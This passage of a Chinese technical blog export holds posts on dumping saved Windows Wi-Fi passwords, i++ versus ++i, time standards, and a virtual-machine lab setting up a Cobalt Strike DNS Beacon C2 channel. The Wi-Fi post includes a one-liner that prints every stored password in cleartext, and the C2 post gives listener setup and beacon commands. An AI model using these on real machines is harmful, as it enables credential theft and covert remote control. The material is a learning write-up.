参考🔗：[Windows 11/10] 如何查看电脑里的Wi-Fi密码 | 官方支持 | ASUS 中国 打开网络适配器界面，选择网卡，点选**[查看此连接的状态]** 点击**[无线属性]** 在**[安全]选项卡下⑧，勾选[显示字符]⑨，即可在网络安全密钥**字段查看此Wi-Fi的密码 cmd方式查看 普通权限cmd 列出了电脑连接过的所有Wi-Fi网络的配置文件。每个Wi-Fi网络都有一个配置文件，其中包含了网络的名称、安全设置等信息。 显示此电脑连接过的所有WIFI记录配置信息1netsh wlan show profile 将 &quot;WiFi名称&quot; 替换为实际的 Wi-Fi 网络名。key=clear 参数的作用是以明文形式显示网络安全密钥（即 Wi-Fi 密码） 显示特定 Wi-Fi 网络的配置详情，包括该网络的密码1netsh wlan show profiles name=&quot;WiFi名称&quot; key=clear 遍历并显示所有曾经连接过的 Wi-Fi 网络的密码 显示电脑所有曾经连接过的Wi-Fi密码1for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 先netsh wlan show profiles获取所有Wi-Fi网络配置文件，然后对每个网络配置文件执行netsh wlan show profiles name=&quot;WiFi名称&quot; key=clear 脚本拆解如下： for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do ...： for /f：对文件或命令输出进行循环处理。 &quot;skip=9&quot;：跳过输出的前9行（这通常是命令输出的标题和一些无关信息）。 tokens=1,2 delims=:&quot;：指定分隔符为冒号，并获取每行的前两个元素（%i 和 %j）。 'netsh wlan show profiles'：此处运行第一个命令，即获取所有 Wi-Fi 配置文件。 @echo %j | findstr -i -v echo | ...： @echo %j：显示每个 Wi-Fi 名称。 | findstr -i -v echo：使用 findstr 过滤输出，排除包含 “echo” 的行（即非 Wi-Fi 名称的行）。 netsh wlan show profiles %j key=clear： 对于每个 Wi-Fi 名称（%j），运行第二个命令，显示其配置文件详情，包括明文密码。 工具改造 代码中可以用system(&quot;&quot;)执行cmd命令，于是可以接收用户输入的wifi名称，然后用netsh命令来获取这个wifi的明文密码。做的就是一些字符串的事，这里不展开，可参考github上这个工具WifiPasswords Windows API方式 上面讲了GUI界面方式，CLI方式（cmd方式），本质肯定都是调API。这一小节就用API来实现。 原理概述 Wi-Fi网络的配置文件以xml格式存储，路径在C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\&#123;GUID&#125;\\&#123;SSID&#125;.xml 这个存储位置好像没法改？在系统上没找到修改的地方，也没看到过相关的资料，话说一般情况下也不会去改吧… 例 &lt;keyMaterial&gt;之间的是wifi密码，直接打开xml文件查看它是加密形式。 通过API方式也能得到这个xml文件内容，而且调用WlanGetProfile时传的参数是WLAN_PROFILE_GET_PLAINTEXT_KEY，&lt;keyMaterial&gt;之间就以明文方式显示。 &#123;D6CAFE19-0195-4D3C-8D89-0ECFC6B92AE6&#125;.xml12345678910111213141516171819202122232425262728293031&lt;?xml version=&quot;1.0&quot;?&gt;&lt;WLANProfile xmlns=&quot;http://www.microsoft.com/networking/WLAN/profile/v1&quot;&gt;\t&lt;name&gt;iPhone 20&lt;/name&gt;\t&lt;SSIDConfig&gt; &lt;SSID&gt; &lt;hex&gt;6950686F6E65203230&lt;/hex&gt; &lt;name&gt;iPhone 20&lt;/name&gt; &lt;/SSID&gt;\t&lt;/SSIDConfig&gt;\t&lt;connectionType&gt;ESS&lt;/connectionType&gt;\t&lt;connectionMode&gt;manual&lt;/connectionMode&gt;\t&lt;MSM&gt; &lt;security&gt; &lt;authEncryption&gt; &lt;authentication&gt;WPA2PSK&lt;/authentication&gt; &lt;encryption&gt;AES&lt;/encryption&gt; &lt;useOneX&gt;false&lt;/useOneX&gt; &lt;/authEncryption&gt; &lt;sharedKey&gt; &lt;keyType&gt;passPhrase&lt;/keyType&gt; &lt;protected&gt;true&lt;/protected&gt; &lt;keyMaterial&gt;01000000D08C9DDF0115D1118C7A00C04FC297EB010000001986A58E28FE8C4DA58449BC9AC4C94D0000000002000000000010660000000100002000000018EA764E465AF977F5A4DEA8AFFCB24CFCA571CC3696640AD352EEBE7982E131000000000E80000000020000200000005FE5EC3CEE7EFDC5A8A87315CDF65DDBD0031F9BFE65814277F2DDD5B1F73DF410000000415A19AA76634330361519F6B701C4CE400000003C0B4D75EF279F91750B61AF9212E9A7938D6785B8D7BE93990D4668217008D963041AE9B948B4BCB6534B1A16CE58972699D04D62253A987C6C46584023AC0F&lt;/keyMaterial&gt; &lt;/sharedKey&gt; &lt;/security&gt;\t&lt;/MSM&gt;\t&lt;MacRandomization xmlns=&quot;http://www.microsoft.com/networking/WLAN/profile/v3&quot;&gt; &lt;enableRandomization&gt;true&lt;/enableRandomization&gt; &lt;randomizationSeed&gt;409283009&lt;/randomizationSeed&gt;\t&lt;/MacRandomization&gt;&lt;/WLANProfile&gt; 也就是说，执行一系列相关API，以明文方式查看XML文件，就能得到wifi密码了 WlanOpenHandle打开WLAN客户端句柄 WlanEnumInterfaces枚举系统中的所有WLAN接口，返回结果在WLAN_INTERFACE_INFO_LIST结构体中 123456789typedef struct _WLAN_INTERFACE_INFO_LIST &#123; DWORD dwNumberOfItems; //the number of items in the InterfaceInfo member DWORD dwIndex; //The index of the current item#if ... WLAN_INTERFACE_INFO *InterfaceInfo[]; //An array of WLAN_INTERFACE_INFO structures containing interface information#else WLAN_INTERFACE_INFO InterfaceInfo[1];#endif&#125; WLAN_INTERFACE_INFO_LIST, *PWLAN_INTERFACE_INFO_LIST; WLAN_INTERFACE_INFO_LIST结构中有每个网卡的WLAN_INTERFACE_INFO信息 12345typedef struct _WLAN_INTERFACE_INFO &#123; GUID InterfaceGuid; //GUID of the interface WCHAR strInterfaceDescription[WLAN_MAX_NAME_LENGTH]; //description of the interface WLAN_INTERFACE_STATE isState; //indicates the current state of the interface&#125; WLAN_INTERFACE_INFO, *PWLAN_INTERFACE_INFO; WlanGetProfileList根据网卡的GUID号获取PROFILE_INFO_LIST（out参数）， 123456789typedef struct _WLAN_PROFILE_INFO_LIST &#123; DWORD dwNumberOfItems; //The number of wireless profile entries in the ProfileInfo member DWORD dwIndex; //The index of the current item.#if ... WLAN_PROFILE_INFO *ProfileInfo[]; //An array of WLAN_PROFILE_INFO structures containing interface information.#else WLAN_PROFILE_INFO ProfileInfo[1];#endif&#125; WLAN_PROFILE_INFO_LIST, *PWLAN_PROFILE_INFO_LIST; PROFILE_INFO_LIST中有每个InterfaceGuid的WLAN_PROFILE_INFO信息 1234typedef struct _WLAN_PROFILE_INFO &#123; WCHAR strProfileName[WLAN_MAX_NAME_LENGTH]; //The name of the profile DWORD dwFlags; //A set of flags specifying settings for wireless profile&#125; WLAN_PROFILE_INFO, *PWLAN_PROFILE_INFO; WlanGetProfile根据profile的名字（strProfileName）获取具体profile的XML文件内容pstrProfileXml（out参数） 相关的API： 123456789WlanOpenHandle //尝试打开WLAN客户端句柄WlanEnumInterfaces\t//枚举系统中的所有WLAN接口WlanGetProfileList\t// 为当前接口获取配置文件列表WlanGetProfile //获取配置文件详细信息，包括密码WlanFreeMemory //清理每个接口的配置文件列表WlanCloseHandle //关闭句柄 执行WlanEnumInterfaces后得到的WLAN_INTERFACE_INFO_LIST结构体里有什么： WLAN_INTERFACE_INFO_LIST结构体定义123456789typedef struct _WLAN_INTERFACE_INFO_LIST &#123; DWORD dwNumberOfItems; DWORD dwIndex;#if ... WLAN_INTERFACE_INFO *InterfaceInfo[];#else WLAN_INTERFACE_INFO InterfaceInfo[1];#endif&#125; WLAN_INTERFACE_INFO_LIST, *PWLAN_INTERFACE_INFO_LIST; 输出显示123456Num Entries: 1Current Index: 0 Interface Index[0]: 0 InterfaceGUID[0]: &#123;234971FE-8E93-4CA8-969F-EB412061852D&#125; Interface Description[0]: Intel(R) Wi-Fi 6 AX201 160MHz Interface State[0]: Connected MSDN示例代码1 执行WlanGetProfileList后，得到的WLAN_PROFILE_INFO_LIST结构体里有什么 1 1 MSDN示例代码1 WlanOpenHandle function (wlanapi.h) WlanEnumInterfaces function (wlanapi.h) WlanCloseHandle function (wlanapi.h) WlanFreeMemory function (wlanapi.h) WLAN_INTERFACE_INFO_LIST structure (wlanapi.h) WLAN_PROFILE_INFO_LIST structure (wlanapi.h) WlanGetProfileList function (wlanapi.h) WlanGetProfile function (wlanapi.h) WLAN_INTERFACE_INFO structure (wlanapi.h) WlanOpenHandle、WlanEnumInterfaces、WlanGetProfileList、WlanGetProfile函数执行成功，返回值是ERROR_SUCCESS The WlanEnumInterfaces function allocates memory for the list of returned interfaces that is returned in the buffer pointed to by the ppInterfaceList parameter when the function succeeds. The memory used for the buffer pointed to by ppInterfaceList parameter should be released by calling the WlanFreeMemory function after the buffer is no longer needed. The WlanGetProfileList function allocates memory for the list of profiles returned in the buffer pointed to by the ppProfileList parameter. The caller is responsible for freeing this memory using the WlanFreeMemory function when this buffer is no longer needed. The caller is responsible for calling the WlanFreeMemory function to free the memory allocated for the buffer pointer to by the pstrProfileXml parameter when the buffer is no longer needed. 编程实现 一些注意的点 程序为了适应ANSI和Unicode环境，用了些自适应宏，_tmain，_tprintf，_T 使用RAII类智能指针+自定义删除器来负责资源的自动释放 编码实现 参考链接🔗 改进&amp;研究 研究这样还原Wifi密码的方式：导出WiFi profile文件，再通过Masterkey还原明文密码 参考链接🔗：使用mimikatz本地还原WiFi密码明文 123","tags":["信息收集","Wifi密码"],"categories":["系统编程","Windows API编程"]},{"title":"i++和++i执行效率分析","path":"/posts/177574ba.html","content":"前言 在C/C++编程中，常用前缀++和后缀++运算符，除了先用后加，先加后用，你有想过它们的区别吗，它们内部如何实现，它们的运行效率？ 12i++; //先用后加++i; //先加后用 理论分析 前缀++ (++i) 递增i的值 return递增后的值 前缀++ 运算符的目的是增加对象的值，并立即使用更新后的值，这一过程不需要存储i的原始值，也不需要额外的临时变量 1234//前缀版本int i = 5;int r = ++i; //1、i的值增加，变为6 //2、6的值传给r 后缀++ (i++) 首先用一个临时变量存一下i的原始值，作为副本 递增i的值 return原始状态的副本的值（如果i++是整个表达式的一部分，就要用到原始的值。i++独立成行的话表达式结果被舍弃，用不到） 无法先return原始的值，i然后再增加，因为一return传值出去，函数就结束了 12345//后缀版本int i = 5; int r = i++; //1、创建一个临时变量作为i的副本，存一下i的值，此时副本的值为5 //2、i的值增加，变为6 //2、将副本的值5，传给r 运算符重载实现 借由C++ 的重载运算符，我们可以通过自己实现前缀++ 和后缀++ 来探究它们运行效率的区别。 123456789101112131415161718192021class MyClass &#123;public: int value; MyClass(int val) : value(val) &#123;&#125; // 前缀++重载 MyClass&amp; operator++() //返回类型为引用，可以做左值，支持链式操作 &#123; ++value; return *this; &#125; // 后缀++重载 MyClass operator++(int) // (int)表示是后缀 &#123; MyClass temp = *this; ++(*this); return temp; &#125;&#125;; 后缀++ 的函数中要调用前缀++ ，所以++i要比i++效率高 执行效率对比 反汇编角度对比 简单数据类型 前缀++12int i = 5;int r = ++i; 后缀++12int i = 5; int r = i++; 对于简单数据类型，编译器做优化了，汇编指令都是5条 复杂对象 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;class MyClass &#123;public: int value; MyClass(int val) : value(val) &#123;&#125; // 前缀++重载 MyClass&amp; operator++() &#123; ++value; return *this; &#125; // 后缀++重载 MyClass operator++(int) // (int)表示是后缀 &#123; MyClass temp = *this; ++(*this); return temp; &#125;&#125;;int main() &#123; MyClass obj1(0); ++obj1; //obj1++; return 0;&#125; 后缀++耗时来源： 临时对象的创建和拷贝 后缀++的函数中调用了前缀++ VS下测执行耗时 VS2019下测i++和i++执行效率12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;chrono&gt;class MyClass &#123;public: int value; MyClass(int val) : value(val) &#123;&#125; // 前缀++重载 MyClass&amp; operator++() &#123; ++value; return *this; &#125; // 后缀++重载 MyClass operator++(int) // (int)表示是后缀 &#123; MyClass temp = *this; ++(*this); return temp; &#125;&#125;;int main() &#123; MyClass obj1(0); MyClass obj2(0); // 测试前缀++ auto start1 = std::chrono::high_resolution_clock::now(); for (int i = 0; i &lt; 1000000; ++i) &#123; ++obj1; &#125; auto end1 = std::chrono::high_resolution_clock::now(); std::chrono::duration&lt;double&gt; duration1 = end1 - start1; // 测试后缀++ auto start2 = std::chrono::high_resolution_clock::now(); for (int i = 0; i &lt; 1000000; ++i) &#123; obj2++; &#125; auto end2 = std::chrono::high_resolution_clock::now(); std::chrono::duration&lt;double&gt; duration2 = end2 - start2; // 使用下这两个变量，防止编译器优化掉 std::cout &lt;&lt; &quot;Prefix duration: &quot; &lt;&lt; duration1.count() &lt;&lt; &quot; seconds&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Postfix duration: &quot; &lt;&lt; duration2.count() &lt;&lt; &quot; seconds&quot; &lt;&lt; std::endl; return 0;&#125; 运行输出12Prefix duration: 0.0138315 secondsPostfix duration: 0.0337065 seconds 小结 对于简单对象（比如基本数据类型，如int类型），编译器的优化会使得它们的效率几乎相同；而对于复杂对象，后缀++ 的实现内部要调用前缀++ ，因此后缀++ 的效率会低。 本文的结论同样适用于前缀--和后缀-- 参考链接 先加后加，孰优孰劣？ —— i 和 i 比较 (qq.com)","tags":["C/C++"],"categories":["编程语言","C/C++"]},{"title":"GMT UTC 时区 CST ISO 夏令时 时间戳 NTP","path":"/posts/2ee0f961.html","content":"学习时遇到与时间相关的词。本篇文章就将这些词一并理清：GMT，UTC，时区，CST，ISO，夏令时，时间戳，NTP。 时区 因为地球🌏绕自转轴自西向东转动（太阳东起西落），所以东时区的人会比西时区的人早一些看到太阳，从而时间上会早一点。 以本初子午线为中心，按照地球自转方向，每隔经度15°划分一个时区，那么全球共分为24个时区（360°÷15°=24个）：东1区至东12区，西1区至西12区。东12区和西12区跨度都是7.5°，共同构成东西12区，也叫半时区。 中国的时区 中国东西横跨5个时区。但全国都统一使用东八区的北京时间，所以会出现现在是19点（北京时间），而新疆的朋友（位于东5/6区实际比东8区晚2-3个小时）还太阳当空照的情况。 美国的时区 共有四个时区，按照图中颜色划分开（并非严格划分，不然出现同一小区隔壁时间比你晚1小时就尴尬了），从右到左依次为： 东部时区（ET）：西5区，代表城市：华盛顿特区、纽约、迈阿密等，也称纽约时间。 北京时间 = ET + 13h 中部时区（CT）：西6区，代表城市：芝加哥、休斯顿等。 北京时间 = CT + 14h 山地时区（MT）：西7区，代表城市：丹佛、凤凰城等。 北京时间 = MT + 15h 太平洋时区（PST）：西8区，代表城市：洛杉矶、拉斯维加斯、西雅图等。 北京时间 = PST + 16h GMT 格林威治（又称：格林尼治）时间，是指位于本初子午线上的地方时，是0时区的区时。它规定太阳每天经过位于英国伦敦郊区的皇家格林威治天文台的时间为中午12点。 19世纪那个大航海时代，英国是日不落帝国，本初子午线定在了英国格林尼治天文台。 纬度。0°纬度，又称本初子午线，经过英国伦敦格林威治天文台。 与时区的换算 本地时间=GMT时间+时区差N 东x区 N为正数 西x区 N为负数 例：假设GMT（英国伦敦的格林威治）现在是上午11点 北京时间是东8区时间，与0时区标准时间相差8小时。那中国北京时间现在就是 11 + 8 = 19点（下午7点）。 美国纽约位于西五区，则时区差N=-5。那美国纽约时间现在就是 11 - 5 = 6点。 UTC 世界协调时间（Coordinated Universal Time）。以原子时作为计量单位的时间，计算结果极其严谨和精密。它比GMT时间更来得精准，误差值必须保持在0.9秒以内，倘若大于0.9秒就会通过闰秒来“解决”。 原子时：物质的原子内部发射的电磁振荡频率为基准的时间计量系统。美国的物理实验市在2014年造出了人类历史上最精确的原子钟，50亿年误差1s，可谓相当靠谱了。中国的铯原子钟也能确保2000万年误差不超过1s。 与偏移量 本地时间：在日常生活中所使用的时间我们通常称之为本地时间。这个时间等于我们所在（或者所使用）时区内的当地时间。 在用GMT时，本地时间通过GMT和时区的关系计算。 而使用UTC时，本地时间通过UTC和偏移量（Offset）来计算。 这个偏移量可表示为：UTC -或UTC +，后面接小时数,分钟数。如： UTC +9:30表示澳大利亚中央标准时间 UTC +8表示中国标准时间 偏移量常见的表示形式有：±[hh]:[mm]、±[hh][mm]、±[hh]这三种方式 在UTC的世界里并无时区的概念，而是偏移量（时间点跟上偏移量才是一个正规的UTC时间），它和时区并无直接关系 可以看到偏移量可以精确到分钟级别控制，非常精细化。全球只有24个时区（只能精确到小时），但偏移量有“无数个”。当然喽为了方便沟通，时间日期联盟组织把世界主要国家/城市的偏移量汇总起来且都给取了个Time zone name名称用于沟通，共好几百个，部分截图如下： https://www.timeanddate.com/time/zones/ GMT与UTC的联系 旧标准和新标准 GMT曾被用作国际标准时间，现在UTC取代了GMT成为新的世界时间标准。 GMT是根据地球的自转和公转来计算时间的，自转一圈是一天，公转一圈是一年。但是呢，地球公转的轨道是椭圆形的，而且后来人们发现地球自转时间也不是恒定的。这样会造成一天时间长一天时间短的情况。 UTC以原子钟所定义的秒长为基础，UTC时间认为一个太阳日（一天）总是恒定的86400秒（24小时）。 其他方面 UTC是标准时间参照，像GMT（格林威治时间）、ET（美国东部时间）、PST（太平洋时间）、CST（北京时间）等等都是具体的时区时间。 GMT能和UTC直接转换，仅仅是因为碰巧GMT是0时区时间，数值上刚好和UTC是相等的（不需要精确到秒的情况下，二者可以视为相等），看起来一样，但是概念含义上请务必区分开。如果需要精确到秒级甚至以下单位需要使用 UTC 其他概念 CST 根据上下文语境推断： CST (China Standard Time) ：中国标准时间 UTC+8:00 Central Standard Time (USA) UTC-6:00 Central Standard Time (Australia) UTC+9:30 Cuba Standard Time UTC-4:00 ISO 一个指定和发布国际标准的组织。ISO发布了与时间相关的标准，例如ISO 8601，一种明确的、国际上都能理解的日历和时钟格式YYYY-MM-DD。在时间日期的有关文章中出现的ISO其实是ISO 8601标准的简写。 夏令时 DST（Daylight Saving Time），夏令时又称夏季时间（没有冬令时）。这是地方政府为了鼓励人们早睡早起，不要浪费电，尽量多用自然资源（因为夏天日照时间长）而人为规定地方时间的一种制度。 每年的夏令时时间段还不一样（一般在3月的第2个周日开始），比如美国2020年夏令时时间是：2020年3月8日 - 2020年11月1日。具体做法是：在3.8号这天将时钟往前拨1个小时，11.1号这天还原回来。 时间戳 定义一个时间原点。从格林威治时间(GMT)1970年1月1日的午夜0点0分0秒开始过去的总秒数/毫秒数。这个总秒数/毫秒数全世界都是一样的，也就是说时间戳和时区无关。 时间戳一般指UNIX时间，或类UNIX系统（比如Linux、MacOS等）使用的时间表示方式。定义为：从UTC时间的1970-1-1 0:0:0起到现在的总秒数（秒是毫秒、微妙、纳秒的总称）。 问题：由于闰秒的存在，那么当闰秒发生时，就极有可能出现同一个时间戳表示两个时刻的情况（类似时钟回拨），而且闰秒还没规律所以无法程序式的避免，怎么办？这个时候就需要一种专门的对时协议来保证了，它就是：网络时间协议。 网络时间协议 NTP（Network Time Protocol）是用来使计算机时间同步化的一种协议，它可以使计算机对其服务器或时钟源（如石英钟，GPS等等)做同步化，它可以提供高精准度的时间校正（LAN上与标准间差小于1毫秒，WAN上几十毫秒），且可介由加密确认的方式来防止恶毒的协议攻击。 NTP的目的是在无序的Internet环境中提供精确和健壮的时间服务，各大操作系统（windows/Linux）对NTP都有实现。 参考链接 GMT UTC CST ISO 夏令时 时间戳，都是些什么鬼？","tags":["GMT","UTC","时区","ISO","夏令时","时间戳","NTP"],"categories":["计算机知识","常识"]},{"title":"Cobalt Strike-DNS Beacon使用解读","path":"/posts/1288e771.html","content":"The DNS Beacon is a favorite Cobalt Strike feature. This payload uses DNS requests to beacon back to you. These DNS requests are lookups against domains that your Cobalt Strike team server is authoritative for. The DNS response tells Beacon to go to sleep or to connect to you to download tasks. The DNS response will also tell the Beacon how to download tasks from your team server. 来看看文档中写的如何创建DNS beacon的监听器。 To create a DNS Beacon listener,select Cobalt Strike -&gt; Listeners on the main menu and press the Add button at the bottom of the Listeners tab display.Select Beacon DNS as the Payload type. Parameters DNS Hosts - Press [+] to add one or more domains to beacon to. Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server’s A record. DNS Host (Stager) - This configures the DNS Beacon’s TXT record stager. This stager is only used with Cobalt Strike features that require an explicit stager. Your Cobalt Strike team server system must be authoritative for this domain as well. DNS Hosts字段填入一个或多个域名。 这些域名都是NS记录，均指向teamserver（假设记为teamserverA）作为权威服务器。 DNS Host(Stager)字段填入一个域名。 当生成的被控端程序是Stager时会用到这个域名，Stager运行后通过访问这个域名来下载stage 这个域名也是NS记录，指向teamserver作为权威服务器。 这个teamserver可以是teamserverA，也可以是其他的teamserver，比如teamserverB。 这个域名可以是DNS Hosts里填的其中某一个，也可以填和DNS Hosts不同的域名。 估计看到这还是迷糊？下面，我们做实验，边做实验边讲解。 实验 创建A记录和NS记录 vps+域名方案 按实战环境来讲的话，需要购买vps，因为要有公网ip，让靶机访问到你的攻击机。需要购买域名，对该域名上配置A记录和NS记录。比如， 要购买能配置NS记录的域名 一条A记录指向CS的IP地址，vpn.test.site =&gt; CS的IP地址 几条NS记录指向刚刚A记录对应的域名（也可以只写一条） ns1.test.site =&gt; vpn.test.site ns2.test.site =&gt; vpn.test.site ns3.test.site =&gt; vpn.test.site 或就只有一条 ns1.test.site =&gt; vpn.test.site **注册登记机构（registrar）**是一个商业实体，它负责验证域名的唯一性，将域名输入DNS数据库。 当你向域名注册商购买了一个域名，配置了这个域名的A记录和NS记录后，域名注册商会负责将你配的记录插入到DNS数据库中。有可能它自己是注册登记机构(registrar)，就能直接插入，也有可能它是交给第三方DNS托管公司负责。总之，当用户尝试访问该域名时，用户的请求可以被解析到正确的IP地址，从而正常访问网站，对于谁将这个域名的A记录和NS记录写入到哪个DNS服务器，是无感的。 也就是说，你买了域名，配了这个域名的A记录和NS记录，然后就可以访问这个域名了，解析不出来的话再具体分析是什么情况，有可能买的不够贵，注册商写入的DNS服务器比较小众或写的DNS服务器比较少。 细节：域名解析有个TTL值据说这东西关系到解析域名要等多长时间，国内的很多厂商设置的最小值可以写60，godaddy最小值为600，建议先把这个东西写成平台允许的最小值，等到检验OK了再调大，一般调成600~900即可。 在博客看到可能出现的问题 在使用DNS Beacon进行测试时发现域名没备案没办法解析到vps的IP上,如果要通过这种方式,最好使用备案的域名或者不需备案的域名等方式 虚拟机方案 如果不买vps和域名，也能做这个实验。给靶机设一个DNS服务器（相当于vps+域名方案中，靶机天然通过DNS服务器解析到域名），这个DNS服务器上有A记录和NS记录。因为我在windows server安装了DNS功能后，没找到NS记录在哪里设置，于是在网上找到了一个软件Simple DNS Plus，安装这个软件后可以配A记录和NS记录，那么就由安装了这个软件的那台虚拟机充当DNS服务器。 虚拟机清单 虚拟机名称 ip 域名 备注 kali-linux-2023.3_client2 192.168.242.130 c2.test.com teamserver和攻击机 被控端A_Windows Server 2019 EN 192.168.242.131 靶机 DNS_Windows Server 2016 EN 192.168.242.140 安装了Simple DNS Plus软件，充当DNS服务器 软件清单 软件名称 作用 cs4.5 Simple DNS Plus 在一台虚拟机上安装该软件，创建A记录和NS记录 安装Simple DNS Plus 选一个符合安装要求的系统安装该软件。Simple DNS Plus安装时会联网下载安装.NET Framework 4.8。如果需要离线安装，先用.NET 4.8的离线安装包安装 .NET 4.8，然后再安装Simple DNS Plus。 打开软件后，可以看到本地地址一列，udp53端口在被使用 File -&gt; Edit DNS Records...或点Records图标修改DNS记录 正向区域 Finish后，创建A记录和NS记录 记得点保存 一条A记录指向CS的IP地址，c2.test.com =&gt; teamserver的IP地址192.168.242.130 3条NS记录指向刚刚A记录对应的域名 ns1.test.com =&gt; c2.test.com ns2.test.com =&gt; c2.test.com ns3.test.com =&gt; c2.test.com Configuracion de servidor DNS en windows con Simple DNS 关闭防火墙 在靶机上配置192.168.242.140为DNS服务器，用nslookup命令检验DNS解析是否正常 启动cs及靶机上线 用的4.5版本的cs，未带profile启动teamserver 1./teamserver 192.168.242.130 password 客户端连接teamserver，配置DNS Beacon 关于DNS Host（Stager）处填A记录的问题在网上看到挺多的文章，这里写的是A记录。在cs4.0版本的文档中的配图，这个字段和DNS Hosts填的都是NS记录。本文最上面引用文档（4.7 | 202211210414 | November 2022）中对于DNS Beacon这个参数的解释说的也是NS记录。DNS Host (Stager) - This configures the DNS Beacon’s TXT record stager. This stager is only used with Cobalt Strike features that require an explicit stager. Your Cobalt Strike team server system must be authoritative for this domain as well.如果我们理解了beacon上线时解析域名的过程，通信流量封装在DNS请求中，由DNS服务器转发，通过NS记录，最终还是会找到teamserver。只要我们配好了：1条A记录指向teamserver的IP，一条或多条NS记录指向A记录。 如果53端口有冲突，关掉占用53端口的其他进程 选的Stageless。如果选stager的话，被控机器要从CS服务器下载完stage的数据才会上线通信，因为dns协议每次传输的数据量很小，要等很长时间才上线。 将生成的beacon投送到靶机执行 此时，图标是个黑框。DNS Beacon只有在有可用任务时才会checkin。使用checkin命令来请求DNS Beacon在下次回连的时候check in。 其实不执行 checkin 也可以。如果执行一个其他命令，比如whoami，它首先会自动check in，再执行其他命令。如果只输入checkin命令，就只返回来元数据 12345beacon&gt; help checkinUse: checkinForces DNS Beacon to connect to you. During a checkin Beacon posts its hostmetadata and dumps logged keystrokes. 使用mode命令来改变当前Beacon的数据通道。DNS Beacon可以通过DNS TXT记录、DNS AAAA记录或DNS A记录下载任务。 mode dns是DNS A记录数据通道； mode dns6是DNS AAAA记录数据通道； mode dns-txt是DNS TXT记录数据通道。DNS TXT记录是默认的数据通道。 1234567891011121314151617181920212223beacon&gt; help modeUse: mode [dns|dns6|dns-txt]Sets Beacon&#x27;s mode to exchange data with the end-user. This only has an effecton a DNS beacon.mode dns--------Get tasks with DNS A record requests. Use this option to communicate with DNS when TXT records are not an option. Sends data as DNS requests with data encodedinside of the hostname.mode dns6---------Get tasks with DNS AAAA record requests. Use this option to communicate with DNS when TXT records are not an option. Sends data as DNS requests with data encodedinside of the hostname.mode dns-txt------------Get tasks with DNS TXT record requests. This channel carries 189 bytes per request versus 4 bytes for a DNS A record request. Sends data with the sametechnique as the other DNS mode. Beacon工作过程 知识回顾 DNS数据库中的记录： A记录：主机名到IP地址的映射 NS记录：域名解析服务器记录，将一个子域名指定某个域名服务器解析 TXT记录：任意填写，可为空，一般做一些验证记录时会使用 大致来说，有三种类型的DNS服务器：根DNS服务器、顶级域（Top-Level Domain,TLD）DNS服务器和权威DNS服务器。为了理解这3种类型的 DNS 服务器交互的方式，假定一个DNS客户要决定主机名 www.amazon.com 的IP地址。粗略说来，将发生下列事件。客户首先与根服务器之一联系，它将返回顶级域名com 的TLD服务器的IP地址。该客户则与这些TLD服务器之一联系，它将为amazon. com返回权威服务器的IP地址。最后，该客户与amazon. com权威服务器之一联系，它为主机名 www.amazon.com 返回其IP地址。 目标主机要对域名1234.profiles.losenolove.com进行解析, 首先查本地缓存，如果没有。就查本地的hosts文件, 若没有，则向本地DNS服务器发送一个DNS查询报文。 本地DNS服务器首先查询自己的本地缓存, 如果有，直接使用这个IP地址与teamserver进行通信。如果没有，则进行迭代查询。将步骤1的查询报文转发到根域名服务器发起询问, 根域名服务器注意到其.com前缀，向本地DNS服务器返回负责.com的TLD的IP地址列表。 本地DNS服务器则再次向这些TLD服务器之一发送查询报文。.com的TLD注意到其losenolove.com前缀，向本地DNS服务器返回负责losenolove.com的中间DNS的IP地址列表。 本地DNS服务器则再次向这些中间DNS服务器之一发送查询报文。losenolove.com这个中间DNS服务器注意到其profiles.losenolove.com前缀，它查找与profiles.losenolove.com关联的NS记录，然后向本地DNS服务器返回权威DNS服务器malwarec2.losenolove.com的IP地址。 最终，本地DNS服务器访问了malwarec2.losenolove.com服务器。 正常过程：查询到了1234.profiles.losenolove.com的响应值, 随后malwarec2.losenolove.com服务器将响应值返回给本地DNS服务器, 本地DNS服务器再返回给目标主机。 cs通信过程：DNS的响应报文中的内容，是teamserver与靶机通信的内容。 之前看《计网》的示例都是A记录，这里要处理NS记录，思考有点转不过来： NS记录是域名系统（DNS）中的一种类型，它指定了负责特定域名的名称服务器。在这种情况下，profiles.losenolove.com是一个NS记录，指向负责处理该子域名查询的服务器。 当DNS查询报文到达losenolove.com服务器后，它会查看查询的是哪个子域名。在这种情况下，它看到查询的是profiles.losenolove.com，所以它会查找与profiles.losenolove.com关联的NS记录。然后，它会将查询报文转发到NS记录指定的服务器，也就是malwarec2.losenolove.com。 实验中Beacon工作过程分析 概括点来说，我们申请了NS记录，A记录。NS记录指向了A记录，A记录指出了ip地址。靶机的Beacon访问子域名，进入递归查询后，查到这些子域名由一个权威服务器负责解析，通过A记录中的ip去找这个权威服务器。 这整个过程，就是靶机-&gt;Teamserver之间的通信。 一条A记录指向CS的IP地址，c2.test.com =&gt; teamserver的IP地址192.168.242.130 3条NS记录指向刚刚A记录对应的域名 ns1.test.com =&gt; c2.test.com ns2.test.com =&gt; c2.test.com ns3.test.com =&gt; c2.test.com 首先，计算机会检查它的本地DNS缓存，看是否有ns1.test.com的IP地址。如果有，它将直接使用这个IP地址。如果没有，它将向配置的DNS服务器发送查询请求。 在上述实验的配置中，我的虚拟机A已经设置了DNS服务器。所以，虚拟机A会向DNS服务器发送一个查询请求，询问ns1.test.com的IP地址。 DNS服务器接收到查询请求后，会查看它的DNS记录。在我的设置中，ns1.test.com是一个NS记录，它指向c2.test.com。然后，虚拟机A会查找c2.test.com的A记录，找到对应的IP地址192.168.242.130。 DNS服务器将这个IP地址返回给虚拟机A，虚拟机A就知道了ns1.test.com的IP地址，可以进行下一步的网络通信。 因为我们在cs上开了dns监听器，cs接收到DNS查询报文后，返回响应报文。 靶机，就在这样的情况下，和cs开始通信了。DNS 响应告诉Beacon休眠或是连接到团队服务器来下载任务。DNS响应也告诉Beacon如何从团队服务器下载任务。 参考 链接 备注 